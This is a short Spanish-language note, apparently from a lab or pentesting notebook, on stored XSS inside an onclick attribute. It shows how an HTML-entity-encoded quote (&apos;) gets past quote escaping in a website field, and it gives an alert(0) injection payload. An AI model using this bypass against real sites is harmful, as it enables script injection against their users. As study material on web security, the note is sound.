# XSS Almacenado 

Tags: #XSS-Stored #JavaScript 

## XSS almacenado en 'onclick' con codificación completa 

```javascript 
// El campo vulnerable se encuentra en la parte del 'website'

	https://web.com'    // El código esta sanitizado, por lo tanto escapa la comilla agregada
	https://web.com&apos;
		' = &apos;     // Representar la ' de otra manera 

	https://web.com&apos;+alert(0)+&apos;    
```